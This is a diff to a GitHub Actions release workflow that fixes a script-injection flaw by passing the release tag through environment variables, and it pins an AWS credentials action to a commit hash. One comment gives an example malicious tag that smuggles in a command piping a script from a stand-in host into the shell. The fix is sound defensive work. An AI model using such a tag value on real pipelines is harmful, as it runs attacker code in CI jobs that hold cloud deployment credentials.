@@ -41,11 +41,20 @@ jobs:
 
       - name: Resolve ops release tag
         id: meta
+        # Passed as environment variables, never interpolated into the script.
+        # `${{ }}` is substituted into the script *text* before bash runs, so a
+        # tag named `v1"; curl evil.sh | sh; x="` executes — and the `tr`
+        # sanitisation below would run far too late to help. As an env var the
+        # value is data, whatever it contains.
+        env:
+          RAW_TAG: ${{ github.event_name == 'release' && github.event.release.tag_name || inputs.release_tag }}
+          RUN_NUMBER: ${{ github.run_number }}
+          RUN_ATTEMPT: ${{ github.run_attempt }}
         run: |
-          raw_tag="${{ github.event_name == 'release' && github.event.release.tag_name || inputs.release_tag }}"
+          raw_tag="$RAW_TAG"
 
           if [ -z "$raw_tag" ]; then
-            raw_tag="ops-${{ github.run_number }}-${{ github.run_attempt }}"
+            raw_tag="ops-${RUN_NUMBER}-${RUN_ATTEMPT}"
           fi
 
           safe_tag="$(printf '%s' "$raw_tag" | tr '/:@ ' '-' | tr -cd '[:alnum:]._-')"
@@ -83,7 +92,7 @@ jobs:
             fi
           done
 
-      - uses: aws-actions/configure-aws-credentials@v6
+      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
         with:
           aws-region: ${{ vars.AWS_REGION }}
           role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
@@ -111,7 +120,7 @@ jobs:
     needs: package-bundle
 
     steps:
-      - uses: aws-actions/configure-aws-credentials@v6
+      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
         with:
           aws-region: ${{ vars.AWS_REGION }}
           role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
